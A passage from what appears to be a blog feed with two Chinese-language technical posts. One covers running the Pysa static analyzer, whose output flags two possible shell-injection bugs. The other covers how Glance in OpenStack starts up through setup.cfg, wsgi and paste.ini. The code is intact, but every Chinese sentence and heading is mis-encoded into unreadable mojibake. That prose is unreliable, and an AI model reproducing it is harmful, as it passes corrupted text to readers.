class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>() -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="comment"># Here, specify all the generators that you might want to call.</span></span><br><span class="line">    generators = &#123;</span><br><span class="line">        <span class="string">&quot;django_path_params&quot;</span>: generate_taint_models.RESTApiSourceGenerator(</span><br><span class="line">            django_urls=view_generator.DjangoUrls(</span><br><span class="line">                urls_module=<span class="string">&quot;urls&quot;</span>,</span><br><span class="line">                url_pattern_type=UrlPattern,</span><br><span class="line">                url_resolver_type=Ignore,</span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;decorator_extracted_params&quot;</span>: generate_taint_models.AnnotatedFreeFunctionWithDecoratorGenerator(</span><br><span class="line">            root=<span class="string">&quot;.&quot;</span>,</span><br><span class="line">            annotation_specifications=[</span><br><span class="line">                generate_taint_models.DecoratorAnnotationSpecification(</span><br><span class="line">                    decorator=<span class="string">&quot;@api_wrapper&quot;</span>,</span><br><span class="line">                    annotations=generator_specifications.default_entrypoint_taint,</span><br><span class="line">                )</span><br><span class="line">            ],</span><br><span class="line">        ),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># The `run_generators` function will take care of parsing command-line arguments, as</span></span><br><span class="line">    <span class="comment"># well as executing the generators specified in `default_modes` unless you pass in a</span></span><br><span class="line">    <span class="comment"># specific set from the command line.</span></span><br><span class="line">    generate_taint_models.run_generators(</span><br><span class="line">        generators,</span><br><span class="line">        default_modes=[</span><br><span class="line">            <span class="string">&quot;django_path_params&quot;</span>,</span><br><span class="line">            <span class="string">&quot;decorator_extracted_params&quot;</span></span><br><span class="line">        ],</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆ <code>.pysa</code> æ–‡ä»¶å¹¶æ‰§è¡Œåˆ†æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python generate_models.py --output-directory .</span><br><span class="line">pyre analyze --no-verify</span><br></pre></td></tr></table></figure><p>æ£€æµ‹å‡º 2 ä¸ªå®‰å…¨é—®é¢˜ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 25,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 25,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://engineering.fb.com/2020/08/07/security/pysa/">Pysa: An open source static analysis tool to detect and prevent security issues in Python code</a></li><li><a href="https://github.com/facebook/pyre-check/tree/master/documentation/pysa_tutorial">Pysa Tutorial</a></li><li><a href="https://pyre-check.org/docs/pysa-basics">Pysa QuickStart guide</a></li><li><a href="https://developers.facebook.com/blog/post/2021/04/29/eli5-pysa-security-focused-analysis-tool-python">ELI5: Pysa - A Security-Focused Static Analysis Tool for Python Code</a></li><li><a href="https://www.youtube.com/watch?v=8I3zlvtpOww">Workshop: Graham Bleaney - Pysa to Identify Python Vulnerabilities - DEF CON 28SM AppSec Village</a></li></ul>]]></content>
    
    
    <summary type="html">åšäº†åšå®˜æ–¹æä¾›çš„ 5 ä¸ªç»ƒä¹ æ•™ç¨‹</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack ç»„ä»¶æºç é˜…è¯»</title>
    <link href="https://jckling.github.io/2021/07/02/OpenStack/OpenStack%20%E7%BB%84%E4%BB%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>https://jckling.github.io/2021/07/02/OpenStack/OpenStack%20%E7%BB%84%E4%BB%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</id>
    <published>2021-07-02T12:22:24.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ®µæ—¶é—´éƒ½åœ¨è¯» OpenStack ç»„ä»¶æºç ï¼Œä¸»è¦ä¾èµ–å®˜æ–¹æ–‡æ¡£å’Œã€ŠOpenStack è®¾è®¡ä¸å®ç°ã€‹ï¼Œç›®å‰è¿™éƒ¨åˆ†çš„å·¥ä½œå‘Šä¸€æ®µè½ï¼Œç¨å¾®æ•´ç†ä¸€ä¸‹é˜…è¯»æºç çš„æ–¹æ³•ï¼Œä¸»è¦æ˜¯å¦‚ä½•æ‰¾åˆ°ç¨‹åºçš„å…¥å£ã€‚</p><p>Kolla-Ansible æ­å»ºç¯å¢ƒä½¿ç”¨çš„æ˜¯ Victoria ç‰ˆæœ¬çš„æºç ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªç»„ä»¶ï¼š</p><ul><li>Keystone</li><li>Glance</li><li>Nova</li><li>Neutron</li><li>Heat</li></ul><h1 id="æºç é˜…è¯»"><a href="#æºç é˜…è¯»" class="headerlink" title="æºç é˜…è¯»"></a>æºç é˜…è¯»</h1><p>å®é™…ä¸Šï¼Œç¨‹åºçš„å…¥å£ä» setup.cfg æ–‡ä»¶å°±å¯ä»¥çœ‹å‡ºæ¥äº†ï¼Œå¦‚ä½•å¤„ç†è¯·æ±‚ä¼šæ¶‰åŠåˆ° paste.ini é…ç½®æ–‡ä»¶ã€‚æœ‰äº›ç»„ä»¶æ¯”è¾ƒå¤æ‚ï¼ˆæ¯”å¦‚ novaã€neutronï¼‰ï¼Œç»„ä»¶æœ¬èº«åŒ…å«å¤šä¸ªå­ç»„ä»¶ï¼Œæœ‰ wsgi åº”ç”¨ã€OS-Ken åº”ç”¨ç­‰ï¼Œå¯åŠ¨æ–¹å¼ä¹Ÿå¹¶ä¸ç»Ÿä¸€ï¼Œå› æ­¤éœ€è¦æ·±å…¥æºç æ‰èƒ½æ‰¾åˆ°çœŸæ­£çš„å¯åŠ¨ä½ç½®å’Œå¯åŠ¨æ–¹å¼ã€‚</p><p>æ­¤å¤–ï¼Œç»„ä»¶ä¸ä»…æœ‰å¯¹å¤–æä¾›çš„ RESTful API æ¥å£ï¼Œç»„ä»¶å†…éƒ¨å’Œç»„ä»¶ä¹‹é—´è¿˜æœ‰ RPC è°ƒç”¨ï¼Œä¼šæ¶‰åŠæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆä¸€èˆ¬æ˜¯ rabbitmqï¼‰å’Œ socket é€šä¿¡ï¼Œè€Œè¿™ä¹Ÿæ˜¯éœ€è¦æ·±å…¥æºç æ‰èƒ½ç†æ¸…çš„ã€‚</p><h2 id="setup-cfg"><a href="#setup-cfg" class="headerlink" title="setup.cfg"></a>setup.cfg</h2><p>ä¸Šè¿° OpenStack ç»„ä»¶éƒ½åŒ…å« setup.cfg æ–‡ä»¶ï¼Œ<a href="https://setuptools.readthedocs.io/en/latest/index.html">Setuptools</a> å·¥å…·ä½¿ç”¨è¯¥é…ç½®æ–‡ä»¶è®¾ç½®åŒ…çš„å…ƒæ•°æ®å’Œå…¶ä»–é€‰é¡¹ï¼Œå…·ä½“çš„é…ç½®é¡¹å¯ä»¥åœ¨ <a href="https://setuptools.readthedocs.io/en/latest/userguide/declarative_config.html#configuring-setup-using-setup-cfg-files">æ–‡æ¡£</a> ä¸­æŸ¥é˜…ã€‚</p><p>è¿™é‡Œä¸»è¦å…³æ³¨çš„æ˜¯ <code>entry_points</code> å°èŠ‚ï¼Œå¯ä»¥æ‰¾åˆ°ä»£ç çš„å…¥å£ç‚¹ï¼Œç»„ä»¶å¯åŠ¨çš„æ–¹å¼åŒ…æ‹¬ <code>console_scripts</code> å’Œ <code>wsgi_scripts</code> ï¼Œåˆ†åˆ«è¡¨ç¤ºå‘½ä»¤è¡Œè„šæœ¬å’Œ wsgi è„šæœ¬ï¼Œé€šå¸¸ wsgi è„šæœ¬é€šè¿‡ Apache + mod_wsgi è°ƒç”¨ã€‚</p><p>ä»¥ glance ä¸ºä¾‹ï¼Œglance-api å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œè„šæœ¬å¯åŠ¨ä¹Ÿå¯ä»¥ä½¿ç”¨ wsgi è„šæœ¬å¯åŠ¨ï¼Œä¸è¿‡å®˜æ–¹å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨å‘½ä»¤è¡Œè„šæœ¬å¯åŠ¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[entry_points]</span><br><span class="line">console_scripts &#x3D;</span><br><span class="line">    glance-api &#x3D; glance.cmd.api:main</span><br><span class="line">    glance-cache-prefetcher &#x3D; glance.cmd.cache_prefetcher:main</span><br><span class="line">    glance-cache-pruner &#x3D; glance.cmd.cache_pruner:main</span><br><span class="line">    glance-cache-manage &#x3D; glance.cmd.cache_manage:main</span><br><span class="line">    glance-cache-cleaner &#x3D; glance.cmd.cache_cleaner:main</span><br><span class="line">    glance-control &#x3D; glance.cmd.control:main</span><br><span class="line">    glance-manage &#x3D; glance.cmd.manage:main</span><br><span class="line">    glance-replicator &#x3D; glance.cmd.replicator:main</span><br><span class="line">    glance-scrubber &#x3D; glance.cmd.scrubber:main</span><br><span class="line">    glance-status &#x3D; glance.cmd.status:main</span><br><span class="line">wsgi_scripts &#x3D;</span><br><span class="line">    glance-wsgi-api &#x3D; glance.common.wsgi_app:init_app</span><br></pre></td></tr></table></figure><p>ç­‰å·å³è¾¹å¯ä»¥ç†è§£ä¸ºè°ƒç”¨çš„å‡½æ•°ï¼Œä»¥ <code>glance-api = glance.cmd.api:main</code> ä¸ºä¾‹ï¼Œå®šä½æºç  glance/cmd/api.py ä¸­çš„ main å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        config.parse_args()             <span class="comment"># è¯»å–é…ç½®</span></span><br><span class="line">        config.set_config_defaults()    <span class="comment"># è®¾ç½®é»˜è®¤é…ç½®</span></span><br><span class="line">        wsgi.set_eventlet_hub()         <span class="comment"># è®¾ç½® eventlet.hub</span></span><br><span class="line">        logging.setup(CONF, <span class="string">&#x27;glance&#x27;</span>)   <span class="comment"># æ—¥å¿—</span></span><br><span class="line">        gmr.TextGuruMeditation.setup_autorun(version)</span><br><span class="line">        notifier.set_defaults()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> CONF.profiler.enabled: <span class="comment"># OSProfiler</span></span><br><span class="line">            osprofiler.initializer.init_from_conf(</span><br><span class="line">                conf=CONF,</span><br><span class="line">                context=&#123;&#125;,</span><br><span class="line">                project=<span class="string">&quot;glance&quot;</span>,</span><br><span class="line">                service=<span class="string">&quot;api&quot;</span>,</span><br><span class="line">                host=CONF.bind_host</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NOTE(danms): Configure system-wide threading model to use eventlet</span></span><br><span class="line">        glance.async_.set_threadpool_model(<span class="string">&#x27;eventlet&#x27;</span>) <span class="comment"># è®¾ç½®åŒæ­¥çº¿ç¨‹æ± æ¨¡å‹</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># NOTE(abhishekk): Added initialize_prefetcher KW argument to Server</span></span><br><span class="line">        <span class="comment"># object so that prefetcher object should only be initialized in case</span></span><br><span class="line">        <span class="comment"># of API service and ignored in case of registry. Once registry is</span></span><br><span class="line">        <span class="comment"># removed this parameter should be removed as well.</span></span><br><span class="line">        initialize_prefetcher = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> CONF.paste_deploy.flavor == <span class="string">&#x27;keystone+cachemanagement&#x27;</span>:</span><br><span class="line">            initialize_prefetcher = <span class="literal">True</span></span><br><span class="line">        server = wsgi.Server(initialize_glance_store=<span class="literal">True</span>,  <span class="comment"># wsgi åº”ç”¨</span></span><br><span class="line">                             initialize_prefetcher=initialize_prefetcher)</span><br><span class="line">        server.start(config.load_paste_app(<span class="string">&#x27;glance-api&#x27;</span>), default_port=<span class="number">9292</span>) <span class="comment"># å¯åŠ¨ wsgi åº”ç”¨</span></span><br><span class="line">        server.wait() <span class="comment"># ç­‰å¾…å¯åŠ¨å®Œæˆ</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        fail(e)</span><br></pre></td></tr></table></figure><p>å†æ¥çœ‹ä¸€ä¸‹ wsgi è„šæœ¬ <code>glance-wsgi-api = glance.common.wsgi_app:init_app</code>ï¼Œå®šä½æºç  glance/common/wsgi_app.py çš„ init_app å‡½æ•°ã€‚é‡ç‚¹å…³æ³¨çš„æ˜¯æœ€åä½¿ç”¨ Paste Deploy åŠ è½½ wsgi åº”ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_app</span>():</span></span><br><span class="line">    config.set_config_defaults()</span><br><span class="line">    config_files = _get_config_files()</span><br><span class="line">    CONF([], project=<span class="string">&#x27;glance&#x27;</span>, default_config_files=config_files)</span><br><span class="line">    logging.setup(CONF, <span class="string">&quot;glance&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(danms): We are running inside uwsgi or mod_wsgi, so no eventlet;</span></span><br><span class="line">    <span class="comment"># use native threading instead.</span></span><br><span class="line">    glance.async_.set_threadpool_model(<span class="string">&#x27;native&#x27;</span>)</span><br><span class="line">    atexit.register(drain_threadpools)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># NOTE(danms): Change the default threadpool size since we</span></span><br><span class="line">    <span class="comment"># are dealing with native threads and not greenthreads.</span></span><br><span class="line">    <span class="comment"># Right now, the only pool of default size is tasks_pool,</span></span><br><span class="line">    <span class="comment"># so if others are created this will need to change to be</span></span><br><span class="line">    <span class="comment"># more specific.</span></span><br><span class="line">    common.DEFAULT_POOL_SIZE = CONF.wsgi.task_pool_threads</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CONF.enabled_backends:</span><br><span class="line">        <span class="keyword">if</span> store_utils.check_reserved_stores(CONF.enabled_backends):</span><br><span class="line">            msg = _(<span class="string">&quot;&#x27;os_glance_&#x27; prefix should not be used in &quot;</span></span><br><span class="line">                    <span class="string">&quot;enabled_backends config option. It is reserved &quot;</span></span><br><span class="line">                    <span class="string">&quot;for internal use only.&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(msg)</span><br><span class="line">        glance_store.register_store_opts(CONF, reserved_stores=RESERVED_STORES)</span><br><span class="line">        glance_store.create_multi_stores(CONF, reserved_stores=RESERVED_STORES)</span><br><span class="line">        glance_store.verify_store()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        glance_store.register_opts(CONF)</span><br><span class="line">        glance_store.create_stores(CONF)</span><br><span class="line">        glance_store.verify_default_store()</span><br><span class="line"></span><br><span class="line">    run_staging_cleanup()</span><br><span class="line"></span><br><span class="line">    _setup_os_profiler()</span><br><span class="line">    <span class="keyword">return</span> config.load_paste_app(<span class="string">&#x27;glance-api&#x27;</span>)  <span class="comment"># Paste Deploy</span></span><br></pre></td></tr></table></figure><h2 id="paste-ini"><a href="#paste-ini" class="headerlink" title="paste.ini"></a>paste.ini</h2><p>paste.ini æ–‡ä»¶æ˜¯ wsgi åº”ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œæ ¹æ®è¯¥æ–‡ä»¶å¯ä»¥çŸ¥é“åº”ç”¨ç¨‹åºæ˜¯å¦‚ä½•æ˜ å°„ URL ä»¥åŠå¦‚ä½•å¤„ç†è¯·æ±‚ã€‚</p><p>paste-ini é…ç½®æ–‡ä»¶ç±»ä¼¼ ini é…ç½®ï¼Œæ¯ä¸ª Section çš„æ ¼å¼å‡ä¸º <code>[type:name]</code> ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªå°èŠ‚</p><ul><li>  compositeï¼šæ”¶åˆ°è¯·æ±‚åé€šè¿‡çš„ç¬¬ä¸€ä¸ª Sectionï¼Œè¡¨ç¤ºéœ€è¦å°† HTTP URL Request è°ƒåº¦åˆ°ä¸€ä¸ªæˆ–è€…å¤šä¸ªåº”ç”¨ä¸­</li><li>  appï¼šå®ç°ä¸»è¦åŠŸèƒ½çš„å…·ä½“åº”ç”¨</li><li>  pipelineï¼šè¿‡æ»¤å™¨ç®¡é“ï¼Œæœ€åä¸€ä¸ªå¿…é¡»æ˜¯ app ç±»å‹</li><li>  filterï¼šå®ç°è¿‡æ»¤å™¨åŠŸèƒ½çš„ä¸­é—´ä»¶ï¼Œç”¨äºè¿‡æ»¤è¯·æ±‚å’Œå“åº”</li></ul><p>ä»ç„¶ä»¥ glance ä¸ºä¾‹ï¼Œå¯åŠ¨ glance æœåŠ¡æ—¶éœ€è¦æŒ‡å®š paste.ini é…ç½®æ–‡ä»¶ï¼Œæºç ä¸­çš„ etc/glance-api-paste.ini é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use this pipeline for no auth or image caching - DEFAULT</span></span><br><span class="line"><span class="section">[pipeline:glance-api]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for image caching and no auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-caching]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context cache rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for caching w/ management interface but no auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler unauthenticated-context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context  rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth with image caching</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone+caching]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context cache rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for keystone auth with caching and cache management</span></span><br><span class="line"><span class="section">[pipeline:glance-api-keystone+cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler authtoken context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for authZ only. This means that the registry will treat a</span></span><br><span class="line"><span class="comment"># user as authenticated without making requests to keystone to reauthenticate</span></span><br><span class="line"><span class="comment"># the user.</span></span><br><span class="line"><span class="section">[pipeline:glance-api-trusted-auth]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler context rootapp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use this pipeline for authZ only. This means that the registry will treat a</span></span><br><span class="line"><span class="comment"># user as authenticated without making requests to keystone to reauthenticate</span></span><br><span class="line"><span class="comment"># the user and uses cache management</span></span><br><span class="line"><span class="section">[pipeline:glance-api-trusted-auth+cachemanagement]</span></span><br><span class="line"><span class="attr">pipeline</span> = cors healthcheck http_proxy_to_wsgi versionnegotiation osprofiler context cache cachemanage rootapp</span><br><span class="line"></span><br><span class="line"><span class="section">[composite:rootapp]</span></span><br><span class="line"><span class="attr">paste.composite_factory</span> = glance.api:root_app_factory</span><br><span class="line">/: apiversions</span><br><span class="line">/v2: apiv2app</span><br><span class="line"></span><br><span class="line"><span class="section">[app:apiversions]</span></span><br><span class="line"><span class="attr">paste.app_factory</span> = glance.api.versions:create_resource</span><br><span class="line"></span><br><span class="line"><span class="section">[app:apiv2app]</span></span><br><span class="line"><span class="attr">paste.app_factory</span> = glance.api.v2.router:API.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:healthcheck]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = oslo_middleware:Healthcheck.factory</span><br><span class="line"><span class="attr">backends</span> = disable_by_file</span><br><span class="line"><span class="attr">disable_by_file_path</span> = /etc/glance/healthcheck_disable</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:versionnegotiation]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.version_negotiation:VersionNegotiationFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cache]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.cache:CacheFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:cachemanage]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = glance.api.middleware.cache_manage:CacheManageFilter.factory</span><br><span class="line"></span><br><span class="line"><span class="section">[filter:context]</span></span><br><span class="line"><span class="attr">paste.filter_factory</span> = 